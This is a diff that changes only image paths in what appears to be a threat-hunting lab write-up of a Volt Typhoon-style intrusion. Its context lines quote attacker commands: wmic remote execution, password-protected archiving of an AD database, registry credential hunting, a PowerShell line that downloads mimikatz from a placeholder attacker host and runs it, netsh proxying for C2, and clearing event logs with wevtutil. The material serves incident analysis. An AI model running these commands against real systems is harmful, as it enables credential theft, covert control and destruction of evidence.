@@ -42,9 +42,9 @@ The threat actor began by targeting the ADSelfService Plus portal — a self-ser
 
 - The attacker reset the password for the `dean-admin` account through the portal.
 - **Within one minute**, a new malicious administrator account was created: `voltyp-admin`.
-![Initial Access](../../images/Volt-Typhoon1.png)
-![Initial Access](../../images/Volt-Typhoon2.png)
-![Initial Access](../../images/Volt-Typhoon3.png)
+![Initial Access](../images/Volt-Typhoon1.png)
+![Initial Access](../images/Volt-Typhoon2.png)
+![Initial Access](../images/Volt-Typhoon3.png)
 - The attacker then performed the following to solidify control:
   - **Enrollment & Unlock** — Completed account enrollment and unlocked the account via web browser.
   - **Credential Hardening** — Changed the password and configured new Security Questions to lock out the legitimate user.
@@ -73,7 +73,7 @@ The attacker executed `wmic` from IP `192.168.1.153` to enumerate logical disks 
 ```
 wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
 ```
-![Disk Reconnaissance](../../images/Volt-Typhoon4.png)
+![Disk Reconnaissance](../images/Volt-Typhoon4.png)
 
 ### Active Directory Extraction
 
@@ -92,14 +92,14 @@ The database was moved to the web server using `xcopy`:
 ```
 wmic /node:webserver-01 process call create "cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot"
 ```
-![Data Staging & Archiving](../../images/Volt-Typhoon5.png)
+![Data Staging & Archiving](../images/Volt-Typhoon5.png)
 
 Then compressed and password-protected with 7-Zip:
 
 ```
 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit
 ```
-![Data Staging & Archiving](../../images/Volt-Typhoon6.png)
+![Data Staging & Archiving](../images/Volt-Typhoon6.png)
 
 | Detail | Value |
 |---|---|
@@ -119,7 +119,7 @@ To maintain a persistent foothold on the compromised server, the attacker deploy
 
 - **Location:** `C:\Windows\Temp\`
 - **Delivery Method:** Base64-encoded script to bypass basic string-based detection.
-![Web Shell Deployment](../../images/Volt-Typhoon7.png)
+![Web Shell Deployment](../images/Volt-Typhoon7.png)
 - The web shell provides the attacker with remote command execution capabilities through the web server, surviving reboots and credential changes.
 
 ---
@@ -139,7 +139,7 @@ Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client\Defau
 ```
 
 **Cmdlet Used:** `Remove-ItemProperty`
-![RDP Artifact Cleanup](../../images/Volt-Typhoon8.png)
+![RDP Artifact Cleanup](../images/Volt-Typhoon8.png)
 
 ### 2. File Masquerading
 
@@ -149,7 +149,7 @@ The stolen archive was renamed from its original name to blend in with legitimat
 |---|---|
 | `cisco-up.7z` | `cl64.gif` |
 
-![File Masquerading](../../images/Volt-Typhoon9.png)
+![File Masquerading](../images/Volt-Typhoon9.png)
 
 Disguising a 7-Zip archive as a `.gif` image file makes it appear as a harmless web resource to casual inspection.
 
@@ -160,7 +160,7 @@ The attacker queried the following registry path to detect whether the environme
 ```
 HKLM\SYSTEM\CurrentControlSet\Control
 ```
-![Anti-Virtualization Check](../../images/Volt-Typhoon10.png)
+![Anti-Virtualization Check](../images/Volt-Typhoon10.png)
 
 This is a known technique used by APTs to confirm they are operating in a real, high-value environment before proceeding.
 
@@ -183,9 +183,9 @@ reg query hklm\software\OpenSSH\Agent
 reg query HKCU\software\dean-admin\PuTTY
 reg query hklm\software\realvnc\vncserver
 ```
-![Registry Credential Hunting](../../images/Volt-Typhoon11.png)
-![Registry Credential Hunting](../../images/Volt-Typhoon12.png)
-![Registry Credential Hunting](../../images/Volt-Typhoon13.png)
+![Registry Credential Hunting](../images/Volt-Typhoon11.png)
+![Registry Credential Hunting](../images/Volt-Typhoon12.png)
+![Registry Credential Hunting](../images/Volt-Typhoon13.png)
 
 ### Mimikatz Execution
 
@@ -194,7 +194,7 @@ The attacker downloaded and executed Mimikatz via an encoded PowerShell command.
 ```powershell
 Invoke-WebRequest -Uri http://<attacker-host>/mimikatz.exe -OutFile mimikatz.exe; Start-Process mimikatz.exe -ArgumentList "sekurlsa::minidump lsass.dmp"
 ```
-![Mimikatz Execution](../../images/Volt-Typhoon14.png)
+![Mimikatz Execution](../images/Volt-Typhoon14.png)
 
 This targeted the `lsass.dmp` memory dump file to extract plaintext passwords and NTLM hashes from memory — providing the attacker with credentials to move laterally.
 
@@ -217,7 +217,7 @@ The attacker used `wevtutil` to query Windows Event Logs, specifically filtering
 ```
 wevtutil qe Security /q:"*[System[(EventID=4624 or EventID=4625 or EventID=4769)]]"
 ```
-![Windows Event Log Enumeration](../../images/Volt-Typhoon15.png)
+![Windows Event Log Enumeration](../images/Volt-Typhoon15.png)
 
 This allowed the attacker to monitor authentication activity and identify additional targets or detect if their presence had been discovered.
 
@@ -235,7 +235,7 @@ The threat actor moved laterally from the initial foothold to `server-02` by cop
 |---|---|
 | `iisstart.aspx` | `AuditReport.jspx` |
 
-![Pivot to Server-02](../../images/Volt-Typhoon16.png)
+![Pivot to Server-02](../images/Volt-Typhoon16.png)
 Renaming the shell to resemble a legitimate audit report file is a deliberate social engineering technique aimed at deceiving system administrators reviewing file listings.
 
 ---
@@ -258,7 +258,7 @@ Copy-Item -Path "C:\...\2024.csv" -Destination "C:\Windows\Temp\faudit\"
 |---|---|
 | `2022.csv`, `2023.csv`, `2024.csv` | `C:\Windows\Temp\faudit\` |
 
-![Financial Data Exfiltration](../../images/Volt-Typhoon17.png)
+![Financial Data Exfiltration](../images/Volt-Typhoon17.png)
 ---
 
 ## Phase 9 — Command and Control (C2)
@@ -278,7 +278,7 @@ netsh interface portproxy add v4tov4 listenport=<local_port> connectaddress=10.2
 | Connect Address | `10.2.30.1` |
 | Connect Port | `8443` |
 
-![Netsh Proxy Setup](../../images/Volt-Typhoon18.png)
+![Netsh Proxy Setup](../images/Volt-Typhoon18.png)
 Using port `8443` (HTTPS alternate) helps blend C2 traffic with normal web traffic, making detection significantly harder.
 
 ---
@@ -297,7 +297,7 @@ wevtutil cl Security
 wevtutil cl Setup
 wevtutil cl System
 ```
-![Event Log Wiping](../../images/Volt-Typhoon19.png)
+![Event Log Wiping](../images/Volt-Typhoon19.png)
 
 | Log Type | Content Destroyed |
 |---|---|
